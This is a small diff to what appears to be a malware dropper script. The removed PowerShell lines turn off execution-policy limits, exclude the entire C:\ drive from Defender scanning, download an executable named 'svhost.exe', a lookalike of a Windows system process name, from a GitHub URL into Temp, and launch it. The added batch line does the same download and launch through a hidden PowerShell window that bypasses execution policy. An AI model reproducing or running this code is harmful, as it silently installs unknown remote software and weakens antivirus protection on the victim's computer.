@@ -1,6 +1,2 @@
-Set-ExecutionPolicy Unrestricted -Scope Process -Force
-Add-MpPreference -ExclusionPath C:\
-$url = "https://github.com/minhdmkk6/t34/raw/refs/heads/main/svhost.exe"
-$output = "$env:Temp/svhost.exe"
-Invoke-WebRequest -Uri $url -OutFile $output
-Start-Process -FilePath $output
+@echo off
+powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri 'https://github.com/minhdmkk6/t34/raw/refs/heads/main/svhost.exe' -OutFile $env:Temp\svhost.exe; Start-Process -FilePath $env:Temp\svhost.exe}"
